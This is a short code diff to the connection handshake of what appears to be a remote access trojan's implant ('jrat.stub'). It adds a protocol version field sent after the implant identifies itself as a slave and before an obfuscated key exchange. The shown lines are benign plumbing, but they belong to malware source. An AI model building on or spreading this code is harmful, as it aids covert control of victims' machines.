@@ -1,6 +1,7 @@
 package io.jrat.stub;
 
 import io.jrat.common.ConnectionCodes;
+import io.jrat.common.Version;
 import io.jrat.common.crypto.Crypto;
 import io.jrat.common.crypto.CryptoUtils;
 import io.jrat.common.crypto.ObfuscatedStreamKeyExchanger;
@@ -70,9 +71,11 @@ public class Connection implements Runnable {
 
 			this.dis = new DataInputStream(inputStream);
 			this.dos = new DataOutputStream(outputStream);
-	        
+
 			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
-			
+
+			this.dos.writeFloat(Version.getProtocolVersion());
+
 			StreamKeyExchanger exchanger = new ObfuscatedStreamKeyExchanger(Main.getKeyPair(), dis, dos);
 			pubKey = exchanger.readRemoteKey();
 			exchanger.writePublicKey();
